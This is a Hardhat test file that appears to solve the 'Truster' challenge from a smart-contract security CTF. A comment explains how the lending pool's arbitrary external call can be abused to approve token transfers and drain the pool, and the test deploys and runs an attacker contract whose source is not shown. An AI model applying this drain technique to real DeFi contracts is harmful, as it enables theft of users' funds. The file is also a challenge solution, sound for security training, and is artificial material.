const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        /**
        * Exploit Overview
        * 
        * @dev
        * 
        * The vulnerability is that the pool lets you run arbitrary data to an arbitrary address
        * We just make it do an external call to the token address with the function approve with 
        * us as the operator. 
        * 
        * You can find the contracts i wrote on /contracts/attacker-contracts
     */
        
        const AttackerContract = await ethers.getContractFactory('AttackerTrusterLenderPool', attacker);
        this.attackerContract = await AttackerContract.deploy(this.token.address, this.pool.address)
        const tx = await this.attackerContract.connect(attacker).attack()
        tx.wait()
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});
